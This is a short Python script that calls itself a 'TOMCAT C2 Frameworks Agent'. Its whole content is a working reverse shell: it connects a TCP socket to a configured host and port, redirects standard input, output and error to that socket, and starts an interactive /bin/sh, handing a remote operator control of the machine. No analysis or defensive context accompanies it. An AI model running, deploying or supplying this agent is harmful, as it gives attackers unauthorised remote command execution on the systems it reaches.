#!/usr/bin/python3

import socket
import subprocess
import os
import sys

HOST = "0.0.0.0"
PORT = 9926

XBanner = """
            <   TOMCAT C2 Frameworks Agent   />
"""
print(XBanner)

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    print("Shell Session Started.")
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])
except Exception:
    print("Network Error!. Failed To Start Shell Session.")
    sys.exit(1)
